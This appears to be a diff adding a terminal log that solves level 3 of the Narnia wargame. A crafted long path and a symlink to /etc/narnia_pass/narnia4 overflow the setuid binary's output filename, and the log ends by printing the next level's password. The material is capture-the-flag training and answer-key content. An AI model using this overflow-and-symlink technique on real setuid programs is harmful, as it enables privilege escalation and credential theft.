@@ -1,0 +1,8 @@
+narnia3@melinda:/narnia$ mkdir -p /tmp/abcdefghijklmnopqrstuvwxyza/tmp
+narnia3@melinda:/narnia$ ln -s /etc/narnia_pass/narnia4 /tmp/abcdefghijklmnopqrstuvwxyza/tmp/read_pass
+narnia3@melinda:/narnia$ touch /tmp/read_pass
+narnia3@melinda:/narnia$ ./narnia3 /tmp/abcdefghijklmnopqrstuvwxyza/tmp/read_pass
+copied contents of /tmp/abcdefghijklmnopqrstuvwxyza/tmp/read_pass to a safer place... (/tmp/read_pass)
+narnia3@melinda:/narnia$ cat /tmp/read_pass
+thaenohtai
+
